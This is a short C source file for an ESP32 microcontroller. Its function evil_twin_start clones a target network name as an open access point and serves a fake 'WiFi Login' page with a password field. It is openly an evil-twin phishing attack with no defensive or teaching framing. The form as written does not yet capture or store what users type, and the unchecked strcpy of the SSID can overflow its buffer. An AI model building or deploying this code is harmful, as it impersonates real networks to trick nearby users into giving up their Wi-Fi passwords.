#include "esp_wifi.h"
#include "esp_http_server.h"
#include <string.h>

static esp_err_t login_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, "<html><body><h1>WiFi Login</h1><form><input type='password'><input type='submit'></form></body></html>", 
                    HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

void evil_twin_start(char *target_ssid) {
    wifi_config_t ap_config = {0};
    strcpy((char *)ap_config.ap.ssid, target_ssid);
    ap_config.ap.ssid_len = strlen(target_ssid);
    ap_config.ap.channel = 6;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.max_connection = 4;
    
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    
    httpd_handle_t server = NULL;
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    httpd_start(&server, &config);
    
    httpd_uri_t uri = {
        .uri = "/",
        .method = HTTP_GET,
        .handler = login_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(server, &uri);
}
